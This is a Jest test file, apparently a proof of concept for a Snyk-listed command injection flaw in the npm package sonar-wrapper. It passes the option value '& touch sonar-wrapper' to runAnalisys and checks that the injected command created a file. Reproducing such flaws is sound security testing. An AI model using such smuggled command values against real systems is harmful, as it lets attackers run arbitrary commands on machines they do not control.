//https://snyk.io/vuln/SNYK-JS-SONARWRAPPER-1050980
test("Command Injection in sonar-wrapper", async () => {
  expect.assertions(2);
  const root = require("sonar-wrapper");
  const fs = require("fs");
  const path = "./sonar-wrapper";
  const sleep = require("sleep");
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  let options = { "sonar.projectName": "& touch sonar-wrapper" };
  try {
    await root.runAnalisys("./", options, []);
  } catch (e) {}

  console.log("HERE-===========>");
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
  // return root.runAnalisys('./', options, []).catch(()=> {
  //   //handle the result here
  //   console.log("called!");
  //   file_exist = fs.existsSync(path);
  //   expect(file_exist).toBe(true);
  //   fs.unlink(path, function (err) {
  //   });
  // });
});
